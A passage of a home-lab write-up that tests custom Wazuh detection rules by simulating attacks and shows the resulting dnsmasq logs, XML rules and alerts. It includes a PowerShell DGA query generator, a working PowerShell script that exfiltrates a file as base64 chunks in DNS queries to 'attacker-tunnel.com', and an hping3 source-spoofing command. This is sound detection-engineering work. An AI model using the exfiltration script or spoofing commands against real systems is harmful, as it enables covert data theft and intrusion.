+**Rule <code>100303</code> &amp; <code>100310</code> (Invalid packet) were tested by using packets with invalid TCP flags.</p></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="example" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-list"><path d="M3 5h.01"></path><path d="M3 12h.01"></path><path d="M3 19h.01"></path><path d="M8 5h13"></path><path d="M8 12h13"></path><path d="M8 19h13"></path></svg></div><div class="callout-title-inner">DGA-like DNS Anomaly Simulation (Rule 100220)</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto"><strong>Attack Execution</strong><br>
+To emulate a basic DGA attack traffic, I used a PowerShell script that uses a simple date-based computation as a seed for a pseudo-random number generator (PRNG). The script then generates and queries 30 pseudo-random <code>{domain}.com</code> names, causing the host to receive a high number of NXDOMAIN responses. Although the DGA script specifies a custom DNS resolver, the firewall redirects DNS traffic to dnsmasq, allowing the queries to be logged and analyzed by Wazuh.</p>
+<pre class="language-powershell"><code data-line="3" class="language-powershell is-loaded"><span class="token variable">$TargetDNS</span> = <span class="token string">"8.8.8.8"</span>
+<span class="token comment"># 1. Gather date variables</span>
+<span class="token variable">$Date</span> = <span class="token function">Get-Date</span>
+<span class="token variable">$Year</span> = <span class="token variable">$Date</span><span class="token punctuation">.</span>Year
+<span class="token variable">$Day</span> = <span class="token variable">$Date</span><span class="token punctuation">.</span>Day
+<span class="token variable">$DayOfWeek</span> = <span class="token variable">$Date</span><span class="token punctuation">.</span>DayOfWeek<span class="token punctuation">.</span>ToString<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token variable">$CountDayOfWeek</span> = <span class="token variable">$DayOfWeek</span><span class="token punctuation">.</span>Length
+
+<span class="token comment"># 2. Calculate the Custom Key: (Year * Day * count(dayofweek)) - Day </span>
+<span class="token variable">$Key</span> = <span class="token punctuation">(</span><span class="token variable">$Year</span> <span class="token operator">*</span> <span class="token variable">$Day</span> <span class="token operator">*</span> <span class="token variable">$CountDayOfWeek</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$Day</span> 
+
+<span class="token comment"># 3. Seed the Random Number Generator for reproducible DGA output</span>
+<span class="token variable">$Rand</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token variable">$Key</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 4. Generate 30 domains and blast the DNS server</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> = 1<span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-le</span> 30<span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment"># Generate a random domain length between 10 and 15 characters</span>
+    <span class="token variable">$DomainLength</span> = <span class="token variable">$Rand</span><span class="token punctuation">.</span>Next<span class="token punctuation">(</span>10<span class="token punctuation">,</span> 16<span class="token punctuation">)</span>
+    
+    <span class="token comment"># Pick random lowercase letters (ASCII 97-122)</span>
+    <span class="token variable">$Chars</span> = <span class="token punctuation">(</span>1<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$DomainLength</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">ForEach-Object</span> <span class="token punctuation">{</span> <span class="token namespace">[char]</span><span class="token variable">$Rand</span><span class="token punctuation">.</span>Next<span class="token punctuation">(</span>97<span class="token punctuation">,</span> 123<span class="token punctuation">)</span> <span class="token punctuation">}</span>
+    <span class="token variable">$Domain</span> = <span class="token punctuation">(</span><span class="token operator">-join</span> <span class="token variable">$Chars</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".com"</span>
+    
+    <span class="token comment"># Send the query and ignore the inevitable NXDOMAIN errors</span>
+    <span class="token function">Resolve-DnsName</span> <span class="token operator">-</span>Name <span class="token variable">$Domain</span> <span class="token operator">-</span>Server <span class="token variable">$TargetDNS</span> <span class="token operator">-</span>QuickTimeout <span class="token operator">-</span>ErrorAction SilentlyContinue <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
+    <span class="token comment"># Tiny sleep to ensure packets space out properly</span>
+    <span class="token function">Start-Sleep</span> <span class="token operator">-</span>Milliseconds 50
+<span class="token punctuation">}</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><code>File: dga_v1.ps1</code></p>
+<hr>
+<p dir="auto"><strong>Aggregated Dnsmasq Logs on Wazuh</strong><br>
+The logs generated by dnsmasq that was forwarded to the Wazuh server.</p>
+<pre><code data-line="38">Aug 21 07:19:20 firewall dnsmasq[19122]: 11 10.0.0.50/59796 reply hozhugrzob.com is NXDOMAIN Aug 21 07:19:20 firewall dnsmasq[19122]: 9 10.0.0.50/64052 reply gcuvdaquzcxpde.com is NXDOMAIN Aug 21 07:19:20 firewall dnsmasq[19122]: 10 10.0.0.50/59796 reply gcuvdaquzcxpde.com is NXDOMAIN
+...
+Aug 21 07:19:25 firewall dnsmasq[19122]: 60 10.0.0.50/60259 reply nwiqhbtszmprwaf.com is NXDOMAIN Aug 21 07:19:24 firewall dnsmasq[19122]: 58 10.0.0.50/60259 reply alzlexpxnpy.com is NXDOMAIN
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><code>File: /var/ossec/logs/archive/archive.log (Wazuh Server)</code></p>
+<hr>
+<p dir="auto"><strong>Rules Triggered</strong><br>
+Rule <code>100203</code> matches external query for a domain. </p>
+<pre class="language-xml"><code data-line="48" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100207<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100203<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>resolved_to<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>NXDOMAIN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS response returned NXDOMAIN status.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100220<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span> <span class="token attr-name">frequency</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">timeframe</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>100207<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>same_srcip</span> <span class="token punctuation">/&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Repeated NXDOMAIN responses observed from same source IP. Possible DGA-like domain activity or reconnaissance behavior.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1568.002<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><code>File: /var/ossec/etc/rules/100200-dnsmasq.xml (Wazuh Server)</code></p>
+<hr>
+<p dir="auto"><strong>Wazuh Alerts</strong><br>
+A <code>rule.level: 7</code> alert was successfully generated on the Wazuh Dashboard. With <code>rule.id: 100220</code>.</p>
+<p dir="auto"><span alt="Pasted image 20260821072018.png" src="_files/pasted-image-20260821072018.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260821072018.png" src="_files/pasted-image-20260821072018.png" target="_self"></span></p>
+</div></div></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="example" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-list"><path d="M3 5h.01"></path><path d="M3 12h.01"></path><path d="M3 19h.01"></path><path d="M8 5h13"></path><path d="M8 12h13"></path><path d="M8 19h13"></path></svg></div><div class="callout-title-inner">DNS Exfiltration Simulation (Rule 100230)</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto"><strong>Attack Execution</strong><br>
+To simulate a malware generating DNS tunneling/exfiltration traffic, I encoded a file into BASE64, then split it into smaller chunks and then performed a DNS lookup where the encoded data will be passed to the attacker as a subdomain along with its chunk's position.</p>
+<pre class="language-powershell"><code data-line="4" class="language-powershell is-loaded"><span class="token variable">$SourcePath</span> = <span class="token string">"<span class="token variable">$env</span>:USERPROFILE\Documents\Data\Datasets\Lauren Furniture Store Transactions.csv"</span>
+<span class="token variable">$TempStaging</span> = <span class="token string">"<span class="token variable">$env</span>:TEMP\staged_data.tmp"</span>
+<span class="token variable">$TargetDNS</span>   = <span class="token string">"172.16.0.1"</span>
+<span class="token variable">$FakeDomain</span>  = <span class="token string">"attacker-tunnel.com"</span>
+
+<span class="token function">Write-Host</span> <span class="token string">"[+] Staging entire file..."</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token variable">$SourcePath</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment"># Copies the complete file to the temp directory</span>
+    <span class="token function">Copy-Item</span> <span class="token operator">-</span>Path <span class="token variable">$SourcePath</span> <span class="token operator">-</span>Destination <span class="token variable">$TempStaging</span> <span class="token operator">-</span>Force
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token string">"TransactionID,Customer,Amount`n1001,DemoUser,250.00"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>FilePath <span class="token variable">$TempStaging</span> <span class="token operator">-</span>Encoding utf8
+<span class="token punctuation">}</span>
+
+<span class="token function">Write-Host</span> <span class="token string">"[+] Preparing 45-character Base64 chunks..."</span>
+<span class="token variable">$RawBytes</span> = <span class="token namespace">[System.IO.File]</span>::ReadAllBytes<span class="token punctuation">(</span><span class="token variable">$TempStaging</span><span class="token punctuation">)</span>
+<span class="token variable">$Base64Data</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token variable">$RawBytes</span><span class="token punctuation">)</span>
+
+<span class="token variable">$ChunkSize</span> = 45
+<span class="token variable">$Chunks</span> = <span class="token namespace">[regex]</span>::Matches<span class="token punctuation">(</span><span class="token variable">$Base64Data</span><span class="token punctuation">,</span> <span class="token string">".{1,<span class="token variable">$ChunkSize</span>}"</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">ForEach-Object</span> <span class="token punctuation">{</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Value <span class="token punctuation">}</span>
+
+<span class="token function">Write-Host</span> <span class="token string">"[+] Transmitting <span class="token function">$<span class="token punctuation">(</span><span class="token variable">$Chunks</span><span class="token punctuation">.</span>Count<span class="token punctuation">)</span></span> chunks via DNS NULL queries... (This will take about a minute)"</span>
+<span class="token variable">$Counter</span> = 1
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Chunk</span> in <span class="token variable">$Chunks</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment"># Sanitize the Base64 string for valid DNS characters</span>
+    <span class="token variable">$SafeChunk</span> = <span class="token variable">$Chunk</span> <span class="token operator">-replace</span> <span class="token string">'\+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span> <span class="token operator">-replace</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'_'</span> <span class="token operator">-replace</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span>
+    
+    <span class="token comment"># FORMAT: [45-Char-Base64].seq[Counter].attacker-tunnel.com</span>
+    <span class="token variable">$QueryFQDN</span> = <span class="token string">"<span class="token variable">$SafeChunk</span>.seq<span class="token variable">$Counter</span>.<span class="token variable">$FakeDomain</span>"</span>
+    <span class="token function">Resolve-DnsName</span> <span class="token operator">-</span>Name <span class="token variable">$QueryFQDN</span> <span class="token operator">-</span><span class="token function">Type</span> NULL <span class="token operator">-</span>Server <span class="token variable">$TargetDNS</span> <span class="token operator">-</span>QuickTimeout <span class="token operator">-</span>ErrorAction SilentlyContinue <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
+    
+    <span class="token variable">$Counter</span><span class="token operator">++</span>
+    <span class="token function">Start-Sleep</span> <span class="token operator">-</span>Milliseconds 100
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token variable">$TempStaging</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">Remove-Item</span> <span class="token operator">-</span>Path <span class="token variable">$TempStaging</span> <span class="token operator">-</span>Force <span class="token punctuation">}</span>
+<span class="token function">Write-Host</span> <span class="token string">"`n[✓] Full file exfiltration complete! Artifacts cleaned up."</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Generated Logs</strong></p>
+<pre><code data-line="44">Aug 21 08:13:29 firewall dnsmasq[19122]: 970 10.0.0.50/49353 query[NULL] m9kdWN0LHByb2R1Y3RfY29kZSxwcm9kdWN0X2NvbG9yLH.seq2.attacker-tunnel.com from 10.0.0.50 Aug 21 08:13:29 firewall dnsmasq[19122]: 969 10.0.0.50/49353 query[NULL] ZGF0ZSx0cmFuc2FjdGlvbl9pZCxjdXN0b21lcl9pZCxwc.seq1.attacker-tunnel.com from 10.0.0.50
+...
+Aug 21 08:13:32 firewall dnsmasq[19122]: 978 10.0.0.50/49353 query[NULL] HdoaXRlLCQxMy45OSwxLDEzLjk5LCQxMy45OQ0KMjAyMC.seq10.attacker-tunnel.com from 10.0.0.50
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Rules Triggered</strong><br>
+Level 9 rule <code>100230</code> (Repeated long domain name with TXT/NULL record type) also triggered its parent rule <code>100214</code> (TXT/NULL record type). The response for those queries resolved to NXDOMAIN which triggered rule <code>100220</code> (Repeated NXdomain). While I can just query for A/AAAA DNS records to blend in with normal traffic, NULL type is almost never seen on live network and TXT records are commonly abused by DNS tunneling tools because they can carry arbitrary text data, making them suitable for command-and-control communication or data transfer.</p>
+<pre class="language-xml"><code data-line="53" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100220<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span> <span class="token attr-name">frequency</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">timeframe</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>100207<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>same_srcip</span> <span class="token punctuation">/&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Repeated NXDOMAIN responses observed from same source IP. Possible DGA-like domain activity or reconnaissance behavior.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1568.002<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100214<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100201<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns_action<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>query\[(TXT|NULL)\]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^.{60,}$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS query exceeded expected domain length threshold using uncommon record type.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100230<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>9<span class="token punctuation">"</span></span> <span class="token attr-name">frequency</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">timeframe</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>100214<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>same_srcip</span> <span class="token punctuation">/&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Repeated long DNS queries using uncommon record types observed from same source IP. Strong indicator of DNS tunneling activity.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1071.004<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Wazuh Alerts</strong><br>
+<span alt="Pasted image 20260728104839.png" src="_files/pasted-image-20260728104839.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260728104839.png" src="_files/pasted-image-20260728104839.png" target="_self"></span></p>
+<p dir="auto">Repeated NXDOMAIN from same source (<code>100220</code>) alert was also generated.<br>
+<span alt="Pasted image 20260728104712.png" src="_files/pasted-image-20260728104712.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260728104712.png" src="_files/pasted-image-20260728104712.png" target="_self"></span></p>
+</div></div></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="example" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-list"><path d="M3 5h.01"></path><path d="M3 12h.01"></path><path d="M3 19h.01"></path><path d="M8 5h13"></path><path d="M8 12h13"></path><path d="M8 19h13"></path></svg></div><div class="callout-title-inner">IP Spoofing from WAN Interface (Rule 100312) </div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">While the ISP should drop a packet with private source IP destined to a public IP, and the packet will be dropped if it reached the lab's stateful firewall. It would still inform security personnel that someone is actively sending crafted packets to the network.</p>
+<p dir="auto"> <strong>Attack Execution</strong><br>
+On the external network, I ran hping3 to generate a TCP packet with source private ip <code>172.16.67.123</code> going to lab firewall's <code>wan0</code> interface <code>192.168.11.200</code> on port 80. Since my public IP is behind ISP CGNAT, I will use the edge router's network to simulate attacks from the 'internet'.</p>
+<pre class="language-bash"><code data-line="5" class="language-bash is-loaded">┌──<span class="token punctuation">(</span>attacker㉿flstudio<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> hping3 <span class="token parameter variable">-a</span> <span class="token number">172.16</span>.67.123 <span class="token parameter variable">-S</span> <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">192.168</span>.11.200
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> attacker:
+HPING <span class="token number">192.168</span>.11.200 <span class="token punctuation">(</span>wlan0 <span class="token number">192.168</span>.11.200<span class="token punctuation">)</span>: S set, <span class="token number">40</span> headers + <span class="token number">0</span> data bytes
+
+--- <span class="token number">192.168</span>.11.200 hping statistic ---
+<span class="token number">1</span> packets transmitted, <span class="token number">0</span> packets received, <span class="token number">100</span>% packet loss
+round-trip min/avg/max <span class="token operator">=</span> <span class="token number">0.0</span>/0.0/0.0 ms
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Generated Log</strong></p>
+<pre><code data-line="17">Jul 29 10:38:49 firewall kernel: [ 1672.784760] NFT-IN-DROP-DEFAULT IN=wan0 OUT= MAC=08:3e:8e:e8:36:57:50:0f:f5:5a:03:98:08:00 SRC=172.16.67.123 DST=192.168.11.200 LEN=40 TOS=0x00 PREC=0x00 TTL=63 ID=20748 PROTO=TCP SPT=2688 DPT=80 WINDOW=512 RES=512 RES=0x00 URGP=0
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
